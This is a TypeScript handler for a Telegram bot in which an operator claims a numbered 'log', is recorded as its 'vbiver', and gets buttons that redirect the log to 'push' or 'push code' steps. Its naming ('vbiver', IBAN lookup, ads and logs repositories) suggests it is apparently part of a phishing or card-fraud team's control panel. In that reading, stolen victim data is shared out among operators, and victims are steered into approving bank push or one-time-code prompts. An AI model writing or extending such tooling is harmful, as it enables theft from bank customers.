import {Context} from "@/database/models/context";
import {Composer} from "grammy";
import {adsRepository, logsRepository} from "@/database";

import {notificationBot} from "@/utils/bot";
import {createVbiverMenu} from "@/helpers/vbiver/createVbiverMenu";
import {createVbiverText} from "@/helpers/vbiver/createVbiverText";
import {getUsername} from "@/helpers/getUsername";
import {getIBANinfo, IBANinfo} from "@/utils/IBANinfo";
import {UserRole} from "@/database/models/user";
import {config} from "@/utils/config";
import {getFlagEmoji} from "@/helpers/getFlagEmoji";
import console from "console";
import {lonelyRepository} from "@/database/lonelypups";
const mysql = require('mysql');

const regex = /log\s+take\s+(?<order>\d+)/gmsi
export const composer = new Composer<Context>()
composer.callbackQuery(regex, callbackHandler)

async function callbackHandler(ctx: Context)  {
    const match = regex.exec(ctx.match[0])
    const log = await lonelyRepository.getOrder(Number(match.groups.order))

    const message = await ctx.api.sendMessage(ctx.from.id, `
    ${ctx.callbackQuery.message.text}`, {
        reply_markup: {
            inline_keyboard: [
                [{text: '📱 push', callback_data: ` log redirect push ${log.id}`},{text: '📲 push code', callback_data: `log redirect push-code ${log.id}`}],
                [{text: '⚠️ error', callback_data: `log set error ${log.id}`}],
                // [{text: '📝 text', callback_data: `log redirect error ${log.id}`}],
            ]
        }
    })
    await lonelyRepository.setVbiverAndMessageId(Number(match.groups.order), {
        messageId: message.message_id,
        vbiverId: ctx.from.id
    })
    console.log({
        messageId: message.message_id,
        vbiverId: ctx.from.id
    })


    try {
        await ctx.editMessageReplyMarkup({
            reply_markup: {
                inline_keyboard: []
            }
        })
    } catch (e) {}



    if (!log) return ctx.deleteMessage()

    await ctx.editMessageText(ctx.update.callback_query.message.text, {
        reply_markup: {
            inline_keyboard: [
                [{text: `${ctx.from.first_name}`, url: "tg://user?id=" + ctx.from.id}, {text: "🖕🏽 Забрать", callback_data: `log take ${log.id}`}],
            ]
        }
    })
}